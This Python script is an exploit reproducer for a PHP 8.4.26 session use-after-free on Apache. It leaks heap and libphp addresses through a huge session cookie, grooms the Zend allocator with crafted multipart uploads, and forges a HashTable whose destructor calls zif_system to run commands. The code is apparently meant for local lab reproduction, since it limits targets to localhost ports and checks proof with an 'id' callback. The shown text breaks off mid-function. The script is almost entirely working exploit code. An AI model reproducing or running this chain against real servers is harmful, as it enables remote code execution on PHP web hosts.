#!/usr/bin/env python3
"""Self-checking HTTP reproduction for the PHP 8.4.26 session UAF chain.

The default registry contains the verified official Debian Trixie
``php:8.4.26-apache`` build and its calibrated heap layouts. Additional builds
may record exact binary symbol maps without claiming a compatible heap layout.
Normal selection remains fail closed; explicit ``--build-id`` candidate testing
keeps the separately selected profile layout. The probe first leaks
a Zend MM chunk address and the loaded libphp base, then reclaims the stale
session global with a forged HashTable whose destructor points at ``zif_system``.

The process exits successfully only after it reads a newly created local
proof file, or after an HTTP proof path returns the expected non-empty content.
It therefore distinguishes memory-corruption symptoms from demonstrated
command execution.
"""

from __future__ import annotations

import argparse
import concurrent.futures
import hashlib
import http.client
import http.server
import json
import re
import secrets
import string
import socket
import ssl
import struct
import sys
import threading
import time
import urllib.parse
from collections import Counter
from dataclasses import dataclass
from pathlib import Path


DEFAULT_PROFILES_FILE = Path(__file__).with_name("profiles.json")
LOCAL_LAB_PORTS = frozenset({18081, 18082, 18083, 18086, 18087, 18088, 18173})

# The stock leak is returned in one URL-encoded Set-Cookie header.  Its raw
# value is 1.56 MiB and can expand to several MiB during URL encoding.
http.client._MAXLINE = 12 << 20


@dataclass(frozen=True)
class Part:
    name: str
    data: bytes
    filename: str | None = None


@dataclass(frozen=True)
class BuildMapping:
    id: str
    php_header: str
    server_header: str
    image_digest: str
    libphp_path: str
    libphp_sha256: str
    zif_system: int
    zval_ptr_dtor: int


@dataclass(frozen=True)
class LayoutMapping:
    id: str
    session_id_length: int
    execution_cookie_length: int
    heap_fillers: int
    array_target: int
    array_value_size: int
    hash_offset: int
    execution_fake_fields: int
    stock_leak_length: int
    stock_execution_pads: int
    stock_execution_carriers: int
    stock_fake_fields: int
    stock_reference_field: int
    stock_reference_offset: int
    fake_payload_size: int
    fake_execute_data_offset: int
    fake_command_zval_offset: int
    fake_command_offset: int
    command_limit: int
    auto_capture_command_size: int


@dataclass(frozen=True)
class RuntimeProfile:
    id: str
    mode: str
    build: BuildMapping
    layout: LayoutMapping
    auto_select: bool
    probe_bytes: int
    probe_contains: tuple[bytes, ...]
    huge_megabytes: int
    minimum_huge_megabytes: int


@dataclass(frozen=True)
class ProfileRegistry:
    builds: dict[str, BuildMapping]
    layouts: dict[str, LayoutMapping]
    profiles: dict[str, RuntimeProfile]


class CallbackProof:
    """Capture fresh `id` stdout when the app has no writable web path."""

    def __init__(self, bind: str, port: int) -> None:
        self.bind = bind
        self.port = port
        self.event = threading.Event()
        self.output = ""
        owner = self

        class Handler(http.server.BaseHTTPRequestHandler):
            def do_POST(self) -> None:  # noqa: N802 - stdlib callback name
                length = int(self.headers.get("Content-Length", "0"))
                payload = self.rfile.read(length) if 0 < length <= 4096 else b""
                if (
                    self.path == "/"
                    and re.search(rb"^uid=[0-9]+", payload)
                    and re.search(rb"\bgid=[0-9]+", payload)
                ):
                    owner.output = payload.decode("ascii", errors="replace").strip()
                    owner.event.set()
                    body = b"proof\n"
                    self.send_response(200)
                else:
                    body = b"invalid identity proof\n"
                    self.send_response(400)
                self.send_header("Content-Type", "text/plain")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, _format: str, *args: object) -> None:
                return

        self.server = http.server.ThreadingHTTPServer((bind, port), Handler)
        self.server.daemon_threads = True
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    def start(self) -> None:
        self.thread.start()

    def wait(self, timeout: float) -> str:
        if not self.event.wait(timeout):
            return ""
        return f"id stdout: {self.output}"

    def close(self) -> None:
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=2.0)


def _required(mapping: dict[str, object], key: str, expected: type) -> object:
    value = mapping.get(key)
    if not isinstance(value, expected):
        raise ValueError(f"profile field {key!r} must be {expected.__name__}")
    return value


def _profile_int(mapping: dict[str, object], key: str) -> int:
    value = mapping.get(key)
    if isinstance(value, bool):
        raise ValueError(f"profile field {key!r} must be an integer")
    if isinstance(value, int):
        return value
    if isinstance(value, str):
        try:
            return int(value, 0)
        except ValueError as exc:
            raise ValueError(
                f"profile field {key!r} is not a valid integer literal"
            ) from exc
    raise ValueError(f"profile field {key!r} must be an integer")


def load_profile_registry(path: Path) -> ProfileRegistry:
    try:
        raw = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as exc:
        raise ValueError(f"cannot load profile registry {path}: {exc}") from exc
    if not isinstance(raw, dict) or raw.get("schema_version") != 1:
        raise ValueError("profile registry schema_version must be 1")

    raw_builds = _required(raw, "builds", dict)
    builds: dict[str, BuildMapping] = {}
    for build_id, item in raw_builds.items():
        if not isinstance(build_id, str) or not isinstance(item, dict):
            raise ValueError("profile build entries must be named objects")
        symbols = _required(item, "symbols", dict)
        builds[build_id] = BuildMapping(
            id=build_id,
            php_header=str(_required(item, "php_header", str)),
            server_header=str(_required(item, "server_header", str)),
            image_digest=str(_required(item, "image_digest", str)),
            libphp_path=str(_required(item, "libphp_path", str)),
            libphp_sha256=str(_required(item, "libphp_sha256", str)).lower(),
            zif_system=_profile_int(symbols, "zif_system"),
            zval_ptr_dtor=_profile_int(symbols, "zval_ptr_dtor"),
        )

    raw_layouts = _required(raw, "layouts", dict)
    layouts: dict[str, LayoutMapping] = {}
    layout_fields = (
        "session_id_length",
        "execution_cookie_length",
        "heap_fillers",
        "array_target",
        "array_value_size",
        "hash_offset",
        "execution_fake_fields",
        "stock_leak_length",
        "stock_execution_pads",
        "stock_execution_carriers",
        "stock_fake_fields",
        "stock_reference_field",
        "stock_reference_offset",
        "fake_payload_size",
        "fake_execute_data_offset",
        "fake_command_zval_offset",
        "fake_command_offset",
        "command_limit",
        "auto_capture_command_size",
    )
    for layout_id, item in raw_layouts.items():
        if not isinstance(layout_id, str) or not isinstance(item, dict):
            raise ValueError("profile layout entries must be named objects")
        values = {key: _profile_int(item, key) for key in layout_fields}
        if values["command_limit"] != (
            values["fake_payload_size"] - values["fake_command_offset"] - 1
        ):
            raise ValueError(
                f"layout {layout_id!r} command_limit disagrees with payload bounds"
            )
        layouts[layout_id] = LayoutMapping(id=layout_id, **values)

    raw_profiles = _required(raw, "profiles", dict)
    profiles: dict[str, RuntimeProfile] = {}
    for profile_id, item in raw_profiles.items():
        if not isinstance(profile_id, str) or not isinstance(item, dict):
            raise ValueError("runtime profile entries must be named objects")
        build_id = str(_required(item, "build", str))
        layout_id = str(_required(item, "layout", str))
        if build_id not in builds or layout_id not in layouts:
            raise ValueError(f"profile {profile_id!r} references an unknown mapping")
        probe_contains = _required(item, "probe_contains", list)
        if not probe_contains or not all(isinstance(value, str) for value in probe_contains):
            raise ValueError(f"profile {profile_id!r} probe_contains must be strings")
        auto_select = item.get("auto_select")
        if not isinstance(auto_select, bool):
            raise ValueError(f"profile {profile_id!r} auto_select must be boolean")
        profiles[profile_id] = RuntimeProfile(
            id=profile_id,
            mode=str(_required(item, "mode", str)),
            build=builds[build_id],
            layout=layouts[layout_id],
            auto_select=auto_select,
            probe_bytes=_profile_int(item, "probe_bytes"),
            probe_contains=tuple(value.encode("utf-8") for value in probe_contains),
            huge_megabytes=_profile_int(item, "huge_megabytes"),
            minimum_huge_megabytes=_profile_int(item, "minimum_huge_megabytes"),
        )
    if not profiles:
        raise ValueError("profile registry contains no runtime profiles")
    return ProfileRegistry(builds=builds, layouts=layouts, profiles=profiles)


def parse_elf_symbol_offsets(path: Path) -> tuple[str, dict[str, int]]:
    data = path.read_bytes()
    digest = hashlib.sha256(data).hexdigest()
    if data[:6] != b"\x7fELF\x02\x01":
        raise ValueError("--libphp must be a little-endian ELF64 file")

    e_phoff = struct.unpack_from("<Q", data, 0x20)[0]
    e_shoff = struct.unpack_from("<Q", data, 0x28)[0]
    e_phentsize, e_phnum = struct.unpack_from("<HH", data, 0x36)
    e_shentsize, e_shnum = struct.unpack_from("<HH", data, 0x3A)
    loads: list[int] = []
    for index in range(e_phnum):
        offset = e_phoff + index * e_phentsize
        p_type = struct.unpack_from("<I", data, offset)[0]
        p_vaddr = struct.unpack_from("<Q", data, offset + 16)[0]
        p_memsz = struct.unpack_from("<Q", data, offset + 40)[0]
        if p_type == 1 and p_memsz:
            loads.append(p_vaddr)
    if not loads:
        raise ValueError("--libphp ELF contains no loadable segment")
    bias = min(loads)

    sections: list[tuple[int, int, int, int, int]] = []
    for index in range(e_shnum):
        offset = e_shoff + index * e_shentsize
        sh_type = struct.unpack_from("<I", data, offset + 4)[0]
        sh_offset, sh_size = struct.unpack_from("<QQ", data, offset + 24)
        sh_link = struct.unpack_from("<I", data, offset + 40)[0]
        sh_entsize = struct.unpack_from("<Q", data, offset + 56)[0]
        sections.append((sh_type, sh_offset, sh_size, sh_link, sh_entsize))

    wanted: dict[str, int | None] = {"zif_system": None, "zval_ptr_dtor": None}
    # PHP 7 exports the destructor under its implementation name.  PHP 8
    # exports the public wrapper name.  Both are the logical destructor used
    # by the build registry; selecting either does not imply layout
    # compatibility with the PHP 8 exploit profile.
    symbol_keys = {
        "zif_system": "zif_system",
        "zval_ptr_dtor": "zval_ptr_dtor",
        "_zval_ptr_dtor": "zval_ptr_dtor",
    }
    for sh_type, sh_offset, sh_size, sh_link, sh_entsize in sections:
        if sh_type not in (2, 11) or sh_link >= len(sections):
            continue
        _, str_offset, _, _, _ = sections[sh_link]
        entry_size = sh_entsize or 24
        for index in range(sh_size // entry_size):
            offset = sh_offset + index * entry_size
            st_name = struct.unpack_from("<I", data, offset)[0]
            st_value = struct.unpack_from("<Q", data, offset + 8)[0]
            if not st_name:
                continue
            name_offset = str_offset + st_name
            end = data.find(b"\x00", name_offset)
            if end < 0:
                continue
            name = data[name_offset:end].decode("ascii", "replace")
            logical_name = symbol_keys.get(name)
            if logical_name is not None and wanted[logical_name] is None:
                wanted[logical_name] = st_value - bias
    missing = [name for name, value in wanted.items() if value is None]
    if missing:
        raise ValueError("--libphp is missing symbols: " + ", ".join(missing))
    return digest, {name: int(value) for name, value in wanted.items()}


def multipart(parts: list[Part], boundary: bytes) -> bytes:
    body = bytearray()
    for part in parts:
        body.extend(b"--" + boundary + b"\r\n")
        body.extend(b'Content-Disposition: form-data; name="')
        body.extend(part.name.encode("ascii"))
        body.extend(b'"')
        if part.filename is not None:
            body.extend(b'; filename="' + part.filename.encode("ascii") + b'"')
            body.extend(b"\r\nContent-Type: application/octet-stream")
        body.extend(b"\r\n\r\n")
        body.extend(part.data)
        body.extend(b"\r\n")
    body.extend(b"--" + boundary + b"--\r\n")
    return bytes(body)


class HttpEndpoint:
    def __init__(self, url: str, timeout: float) -> None:
        parsed = urllib.parse.urlsplit(url)
        if parsed.scheme != "http":
            raise ValueError("the published reproducer accepts only http:// local labs")
        if parsed.username or parsed.password or parsed.fragment:
            raise ValueError("userinfo and URL fragments are not accepted")
        host = parsed.hostname
        if host not in {"localhost", "127.0.0.1", "::1"}:
            raise ValueError("target must be localhost, 127.0.0.1, or ::1")
        port = parsed.port or 80
        if port not in LOCAL_LAB_PORTS:
            allowed = ", ".join(str(item) for item in sorted(LOCAL_LAB_PORTS))
            raise ValueError(f"target port must be one of the shipped lab ports: {allowed}")
        self.tls = parsed.scheme == "https"
        self.host = host
        self.connect_host = "127.0.0.1" if host == "localhost" else host
        self.port = port
        self.path = parsed.path or "/"
        if parsed.query:
            self.path += "?" + parsed.query
        self.timeout = timeout

    def connect(self) -> socket.socket:
        failure: OSError | None = None
        for _ in range(10):
            try:
                stream = socket.create_connection(
                    (self.connect_host, self.port), timeout=self.timeout
                )
                if self.tls:
                    stream = ssl.create_default_context().wrap_socket(
                        stream, server_hostname=self.host
                    )
                stream.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                return stream
            except OSError as exc:
                failure = exc
                time.sleep(0.3)
        assert failure is not None
        raise failure

    def post(
        self,
        parts: list[Part],
        boundary: bytes,
        *,
        headers: dict[str, str] | None = None,
        read_limit: int = 1 << 20,
        timeout: float | None = None,
    ) -> bytes:
        body = multipart(parts, boundary)
        extra = "".join(f"{key}: {value}\r\n" for key, value in (headers or {}).items())
        request = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"{extra}"
            f"Content-Type: multipart/form-data; boundary={boundary.decode('ascii')}\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n\r\n"
        ).encode("ascii")

        stream = self.connect()
        stream.settimeout(timeout or self.timeout)
        received = bytearray()

        # The worker can abort immediately after returning Set-Cookie.  Reading
        # concurrently preserves response bytes already delivered before RST.
        def receive() -> None:
            try:
                while len(received) < read_limit:
                    block = stream.recv(min(65536, read_limit - len(received)))
                    if not block:
                        return
                    received.extend(block)
            except OSError:
                return

        reader = threading.Thread(target=receive, daemon=True)
        reader.start()
        try:
            try:
                stream.sendall(request)
                view = memoryview(body)
                for offset in range(0, len(body), 262144):
                    stream.sendall(view[offset : offset + 262144])
            except OSError:
                pass
            reader.join((timeout or self.timeout) + 1.0)
            return bytes(received)
        finally:
            stream.close()

    def get_response(
        self, path: str, read_limit: int = 1 << 20
    ) -> tuple[int, dict[str, str], bytes]:
        request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            "Connection: close\r\n\r\n"
        ).encode("ascii")
        stream = self.connect()
        stream.settimeout(self.timeout)
        received = bytearray()
        try:
            stream.sendall(request)
            try:
                while len(received) < read_limit:
                    block = stream.recv(min(65536, read_limit - len(received)))
                    if not block:
                        break
                    received.extend(block)
            except OSError:
                pass
        finally:
            stream.close()
        head, _, body = bytes(received).partition(b"\r\n\r\n")
        match = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        headers: dict[str, str] = {}
        for line in head.split(b"\r\n")[1:]:
            name, separator, value = line.partition(b":")
            if separator:
                headers[name.decode("latin1").lower()] = value.decode("latin1").strip()
        return (int(match.group(1)) if match else 0), headers, body

    def get(self, path: str, read_limit: int = 1 << 20) -> tuple[int, bytes]:
        status, _, body = self.get_response(path, read_limit)
        return status, body


class KeepAliveEndpoint:
    """One HTTP connection pinned to one Apache prefork worker."""

    def __init__(self, endpoint: HttpEndpoint) -> None:
        self.endpoint = endpoint
        if endpoint.tls:
            self.connection: http.client.HTTPConnection = http.client.HTTPSConnection(
                endpoint.host,
                endpoint.port,
                timeout=endpoint.timeout,
                context=ssl.create_default_context(),
            )
        else:
            self.connection = http.client.HTTPConnection(
                endpoint.host, endpoint.port, timeout=endpoint.timeout
            )

    def close(self) -> None:
        self.connection.close()

    def get_response(
        self, path: str, read_limit: int = 1 << 20
    ) -> tuple[int, dict[str, str], bytes]:
        self.connection.request(
            "GET",
            path,
            headers={"Connection": "keep-alive"},
        )
        response = self.connection.getresponse()
        headers = {name.lower(): value for name, value in response.getheaders()}
        body = response.read(read_limit)
        if response.length not in (None, 0):
            response.read()
        return response.status, headers, body

    def post(
        self,
        parts: list[Part],
        boundary: bytes,
        *,
        headers: dict[str, str] | None = None,
    ) -> tuple[int, bool, str, bytes]:
        body = multipart(parts, boundary)
        request_headers = {
            "Content-Type": "multipart/form-data; boundary="
            + boundary.decode("ascii"),
            "Connection": "keep-alive",
        }
        request_headers.update(headers or {})
        self.connection.request(
            "POST",
            self.endpoint.path,
            body=body,
            headers=request_headers,
        )
        response = self.connection.getresponse()
        cookie = response.getheader("Set-Cookie", "")
        response_body = response.read()
        return response.status, response.will_close, cookie, response_body


class ChunkedKeepAliveEndpoint:
    """Raw-response transport that pins one producer/consumer pair to a worker.

    Producer bodies use HTTP chunked transfer coding so Apache does not supply
    PHP with a usable Content-Length.  This lets the request reach the normal
    memory limit instead of being rejected by the stock post_max_size check.
    """

    def __init__(self, endpoint: HttpEndpoint) -> None:
        self.endpoint = endpoint
        self.timeout = endpoint.timeout
        if endpoint.tls:
            self.connection: http.client.HTTPConnection = http.client.HTTPSConnection(
                endpoint.host,
                endpoint.port,
                timeout=endpoint.timeout,
                context=ssl.create_default_context(),
            )
        else:
            self.connection = http.client.HTTPConnection(
                endpoint.host, endpoint.port, timeout=endpoint.timeout
            )

    def close(self) -> None:
        self.connection.close()

    def _send_chunk(self, data: bytes | memoryview) -> None:
        view = memoryview(data)
        for offset in range(0, len(view), 262144):
            chunk = view[offset : offset + 262144]
            self.connection.send(f"{len(chunk):x}\r\n".encode("ascii"))
            self.connection.send(chunk)
            self.connection.send(b"\r\n")

    def _send_chunked_multipart(self, parts: list[Part], boundary: bytes) -> None:
        for part in parts:
            header = bytearray(b"--" + boundary + b"\r\n")
            header.extend(b'Content-Disposition: form-data; name="')
            header.extend(part.name.encode("ascii"))
            header.extend(b'"')
            if part.filename is not None:
                header.extend(b'; filename="' + part.filename.encode("ascii") + b'"')
                header.extend(b"\r\nContent-Type: application/octet-stream")
            header.extend(b"\r\n\r\n")
            self._send_chunk(header)
            self._send_chunk(part.data)
            self._send_chunk(b"\r\n")
        self._send_chunk(b"--" + boundary + b"--\r\n")
        self.connection.send(b"0\r\n\r\n")

    def post(
        self,
        parts: list[Part],
        boundary: bytes,
        *,
        headers: dict[str, str] | None = None,
        read_limit: int = 1 << 20,
        timeout: float | None = None,
    ) -> bytes:
        request_headers = {
            "Content-Type": "multipart/form-data; boundary="
            + boundary.decode("ascii"),
            "Connection": "keep-alive",
        }
        request_headers.update(headers or {})
        self.connection.timeout = timeout or self.timeout
        chunked = any(part.name == "big" for part in parts)
        if chunked:
            self.connection.putrequest(
                "POST", self.endpoint.path, skip_accept_encoding=True
            )
            for key, value in request_headers.items():
                self.connection.putheader(key, value)
            self.connection.putheader("Transfer-Encoding", "chunked")
            self.connection.endheaders()
            self._send_chunked_multipart(parts, boundary)
        else:
            self.connection.request(
                "POST",
                self.endpoint.path,
                body=multipart(parts, boundary),
                headers=request_headers,
            )

        response = self.connection.getresponse()
        response_body = response.read()
        status = (
            f"HTTP/1.1 {response.status} {response.reason}\r\n".encode("latin1")
        )
        raw_headers = b"".join(
            f"{key}: {value}\r\n".encode("latin1")
            for key, value in response.getheaders()
        )
        return status + raw_headers + b"\r\n" + response_body[:read_limit]


def decoded_session_cookie(response: bytes) -> bytes:
    match = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", response)
    if match is None:
        return b""
    return urllib.parse.unquote_to_bytes(match.group(1).decode("latin1"))


def find_heap_chunk(cookie: bytes) -> int:
    if len(cookie) < 1000:
        return 0
    candidates: Counter[int] = Counter()
    for offset in range(0, len(cookie) - 7):
        pointer = int.from_bytes(cookie[offset : offset + 8], "little")
        if 0x7F0000000000 <= pointer < 0x800000000000:
            candidates[pointer & ~0x1FFFFF] += 1
    if not candidates:
        return 0
    base, observations = candidates.most_common(1)[0]
    return base if observations >= 8 else 0


def find_libphp(cookie: bytes, destructor_offset: int) -> int:
    if len(cookie) < 16:
        return 0
    pointer = int.from_bytes(cookie[8:16], "little")
    if not 0x7F0000000000 <= pointer < 0x800000000000:
        return 0
    if (pointer & 0xFFF) != (destructor_offset & 0xFFF):
        return 0
    base = pointer - destructor_offset
    return base if (base & 0xFFF) == 0 else 0


def load_offsets(path: Path | None) -> dict[str, int]:
    values: dict[str, int] = {}
    if path is None:
        return values
    for raw in path.read_text(encoding="utf-8").splitlines():
        line = raw.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        key, value = line.split("=", 1)
        values[key.strip()] = int(value.strip(), 0)
    return values


def fake_hashtable_payload(
    command: bytes, address: int, zif_system: int, layout: LayoutMapping
) -> bytes:
    payload = bytearray(layout.fake_payload_size)
    struct.pack_into("<II", payload, 0x00, 1, 7)
    struct.pack_into("<II", payload, 0x08, 0x10, 0xFFFFFFF8)
    struct.pack_into("<Q", payload, 0x10, address + 0x20)
    struct.pack_into("<II", payload, 0x18, 1, 1)
    struct.pack_into("<II", payload, 0x20, 8, 0)
    struct.pack_into("<Q", payload, 0x28, 0)
    struct.pack_into("<Q", payload, 0x30, zif_system)

    execute_data = layout.fake_execute_data_offset
    struct.pack_into("<Q", payload, execute_data + 0x00, 0)
    struct.pack_into("<Q", payload, execute_data + 0x08, 0)
    struct.pack_into("<Q", payload, execute_data + 0x10, zif_system)
    struct.pack_into("<Q", payload, execute_data + 0x18, 0)
    struct.pack_into("<Q", payload, execute_data + 0x20, 0)
    struct.pack_into("<I", payload, execute_data + 0x28, 0)
    struct.pack_into("<I", payload, execute_data + 0x2C, 1)
    struct.pack_into("<Q", payload, execute_data + 0x30, 0)
    struct.pack_into("<Q", payload, execute_data + 0x38, 0)
    struct.pack_into("<I", payload, execute_data + 0x40, 0)
    struct.pack_into(
        "<Q", payload, execute_data + 0x50, address + layout.fake_command_zval_offset
    )
    struct.pack_into("<I", payload, execute_data + 0x58, 6)

    command_zval = layout.fake_command_zval_offset
    struct.pack_into("<II", payload, command_zval, 1, 0x106)
    struct.pack_into("<Q", payload, command_zval + 0x08, 0)
    struct.pack_into("<Q", payload, command_zval + 0x10, len(command))
    command_offset = layout.fake_command_offset
    payload[command_offset : command_offset + len(command)] = command
    payload[command_offset + len(command)] = 0
    return bytes(payload)


class Reproducer:
    def __init__(
        self,
        endpoint: HttpEndpoint,
        command: bytes,
        zif_offset: int,
        destructor_offset: int,
        huge_megabytes: int,
        layout: LayoutMapping,
        session_id: bytes,
    ) -> None:
        self.http = endpoint
        self.command = command
        self.zif_offset = zif_offset
        self.destructor_offset = destructor_offset
        self.huge_megabytes = huge_megabytes
        self.layout = layout
        self.session_id = session_id

    def oversized(self) -> Part:
        return Part("big", b"B" * (self.huge_megabytes * 1024 * 1024))

    @staticmethod
    def upload() -> Part:
        return Part("f", b"A" * 64, filename="a.txt")

    def reset_worker(self) -> None:
        print("[*] requesting a fresh prefork worker", flush=True)
        pressure = [Part(f"f{i:04d}"[:5], b"V" * 3000) for i in range(1001)]
        pressure.extend(
            [
                Part("PHPSESSID", b"\x00"),
                Part("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
                self.upload(),
                self.oversized(),
            ]
        )
        self.http.post(pressure, b"S" * 17, timeout=max(90.0, self.http.timeout))
        time.sleep(0.3)
        trigger = [
            Part("PHPSESSID", self.session_id),
            Part("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
        ]
        self.http.post(trigger, b"BNDRY12345", read_limit=65536, timeout=20.0)
        time.sleep(0.5)

    def leak_heap(self) -> int:
        prime = [Part(f"p{i:04d}", b"x") for i in range(1001)]
        prime.extend(
            [
                Part("PHPSESSID", b"\x00"),
                Part("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
                self.upload(),
                self.oversized(),
            ]
        )
        self.http.post(prime, b"S" * 17, timeout=max(90.0, self.http.timeout))
        time.sleep(0.2)

        reclaim = [
            Part("PHPSESSID", self.session_id),
            Part("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
        ]
        for index in range(self.layout.heap_fillers):
            value = (f"v{index:04d}" + "x" * 44)[:48].encode("ascii")
            reclaim.append(Part(str(1000 + index), value))
        forged = bytearray(b"A" * 79)
        struct.pack_into("<Q", forged, 0x10, 0x1000)
        forged[0x18] = ord("L")
        reclaim.append(Part("1999", bytes(forged)))
        response = self.http.post(reclaim, b"B" * 10, read_limit=9 << 20)
        return find_heap_chunk(decoded_session_cookie(response))

    def leak_libphp(self) -> int:
        prime = [Part(f"f{i:04d}"[:5], b"x" * 39) for i in range(1001)]
        prime.extend(
            [
                Part("PHPSESSID", b"\x00"),
                Part("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
                self.upload(),
                self.oversized(),
            ]
        )
        self.http.post(prime, b"S" * 17, timeout=max(90.0, self.http.timeout))
        time.sleep(0.2)

        reclaim = [
            Part("PHPSESSID", self.session_id),
            Part("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
        ]
        for array_index in range(983):
            count = 16 if array_index == self.layout.array_target else 1
            for value_index in range(count):
                reclaim.append(
                    Part(
                        f"a{array_index:04d}[{value_index}]",
                        b"x" * self.layout.array_value_size,
                    )
                )
        response = self.http.post(reclaim, b"B" * 10)
        return find_libphp(decoded_session_cookie(response), self.destructor_offset)

    def fake_hashtable(self, address: int, zif_system: int) -> bytes:
        return fake_hashtable_payload(self.command, address, zif_system, self.layout)

    def execute(self, fake_table_address: int, zif_system: int) -> None:
        prime = [
            Part("PHPSESSID", b"a" * self.layout.session_id_length),
            Part("PHP_SESSION_UPLOAD_PROGRESS", b"p" * 3),
        ]
        for index in range(6):
            prime.append(Part(f"p{index:030d}"[:31], b"V" * 31))
        prime.extend([self.upload(), self.oversized()])
        self.http.post(
            prime,
            b"S" * 17,
            headers={
                "Cookie": "PHPSESSID=" + "a" * self.layout.execution_cookie_length
            },
            timeout=max(90.0, self.http.timeout),
        )
        time.sleep(0.3)

        fake_table = self.fake_hashtable(fake_table_address, zif_system)
        # This bin-40 zend_string lands on the stale reference.  Its first
        # eight bytes preserve the reference header and the next seven bytes
        # replace the value pointer with the sprayed HashTable address.
        carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", fake_table_address)[:7]
        reclaim = [
            Part("PHPSESSID", self.session_id),
            Part("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
            Part("f00", b"F" * 15),
            Part("f01", b"F" * 15),
            Part("g00", carrier),
        ]
        reclaim.extend(
            Part(f"a{index:030d}"[:31], fake_table)
            for index in range(self.layout.execution_fake_fields)
        )
        self.http.post(reclaim, b"B" * 10, read_limit=65536, timeout=30.0)


class StockReproducer:
    """Default-config exploit path pinned to one Apache prefork worker."""

    def __init__(
        self,
        endpoint: HttpEndpoint,
        command: bytes,
        zif_offset: int,
        destructor_offset: int,
        hash_offset: int,
        layout: LayoutMapping,
        session_id: bytes,
    ) -> None:
        self.http = KeepAliveEndpoint(endpoint)
        self.command = command
        self.zif_offset = zif_offset
        self.destructor_offset = destructor_offset
        self.hash_offset = hash_offset
        self.layout = layout
        self.session_id = session_id

    def close(self) -> None:
        self.http.close()

    def compact_oom(self, *, execution: bool) -> list[Part]:
        if execution:
            parts = [
                Part("PHPSESSID", b"a" * self.layout.session_id_length),
                Part("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
            ]
            parts.extend(
                Part(f"p{index:06d}", b"V" * 7)
                for index in range(self.layout.stock_execution_pads)
            )
        else:
            parts = [
                Part("PHPSESSID", b"\x00"),
                Part("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
                Part("f", b"A" * 64, filename="a.txt"),
            ]
        parts.extend(
            Part(f"z{index}" + "[a]" * 60, b"", filename="")
            for index in range(950)
        )
        return parts

    def leak_reclaim(self) -> list[Part]:
        forged = bytearray(b"A" * 63)
        struct.pack_into("<Q", forged, 0x10, self.layout.stock_leak_length)
        forged[0x18:0x21] = b"STOCKLEAK"
        return [
            Part("PHPSESSID", self.session_id),
            Part("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
            Part("1000", bytes(forged)),
        ]

    def parse_addresses(self, cookie_header: str) -> tuple[int, int]:
        if not cookie_header.startswith("PHPSESSID="):
            return 0, 0
        encoded = cookie_header[len("PHPSESSID=") :].split(";", 1)[0]
        raw = urllib.parse.unquote_to_bytes(encoded)
        if len(raw) < 1 << 20:
            return 0, 0

        chunks: Counter[int] = Counter()
        destructor_candidates: Counter[int] = Counter()
        for offset in range(len(raw) - 7):
            pointer = int.from_bytes(raw[offset : offset + 8], "little")
            if not 0x7F0000000000 <= pointer < 0x800000000000:
                continue
            chunks[pointer & ~0x1FFFFF] += 1
            if (pointer & 0xFFF) == (self.destructor_offset & 0xFFF):
                destructor_candidates[pointer] += 1

        if not chunks:
            return 0, 0
        heap, heap_observations = chunks.most_common(1)[0]
        if heap_observations < 8:
            return 0, 0

        for pointer, observations in destructor_candidates.most_common():
            base = pointer - self.destructor_offset
            if observations < 6:
                break
            if (base & 0xFFF) == 0 and (pointer & ~0x1FFFFF) != heap:
                return heap, base
        return 0, 0

    def leak_addresses(self) -> tuple[int, int]:
        cookie_spray = ("aa=v;" * 1001).rstrip(";")
        status, closed, _, body = self.http.post(
            self.compact_oom(execution=False),
            b"S" * 17,
            headers={"Cookie": cookie_spray},
        )
        if status != 200 or closed or b"Allowed memory size" not in body:
            return 0, 0

        status, closed, cookie, _ = self.http.post(
            self.leak_reclaim(), b"B" * 10
        )
        if status != 200 or closed:
            return 0, 0
        return self.parse_addresses(cookie)

    def execution_reclaim(self, fake_address: int, zif_system: int) -> list[Part]:
        carrier = (
            struct.pack("<II", 1, 0x1A)
            + struct.pack("<Q", fake_address)[:7]
        )
        parts = [
            Part("PHPSESSID", self.session_id),
            Part("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
        ]
        parts.extend(
            Part(str(1000 + index), carrier)
            for index in range(self.layout.stock_execution_carriers)
        )

        fake = fake_hashtable_payload(
            self.command, fake_address, zif_system, self.layout
        )
        for index in range(self.layout.stock_fake_fields):
            value = bytearray(fake)
            if index == self.layout.stock_reference_field:
                struct.pack_into(
                    "<II", value, self.layout.stock_reference_offset, 1, 0x1A
                )
                struct.pack_into(
                    "<Q", value, self.layout.stock_reference_offset + 8, fake_address
                )
                struct.pack_into(
                    "<Q", value, self.layout.stock_reference_offset + 16, 0x307
                )
                struct.pack_into(
                    "<Q", value, self.layout.stock_reference_offset + 24, 0
                )
            parts.append(Part(f"a{index:030d}"[:31], bytes(value)))
        return parts

    def execute(self, heap: int, libphp: int) -> None:
        status, closed, _, body = self.http.post(
            self.compact_oom(execution=True),
            b"S" * 17,
            headers={
                "Cookie": "PHPSESSID=" + "a" * self.layout.execution_cookie_length
            },
        )
        if status != 200 or closed or b"Allowed memory size" not in body:
            raise RuntimeError("stock execution producer did not reach OOM")

        fake_address = heap + self.hash_offset
        zif_system = libphp + self.zif_offset
        try:
            self.http.post(
                self.execution_reclaim(fake_address, zif_system), b"B" * 10
            )
        except (ConnectionError, http.client.HTTPException, OSError):
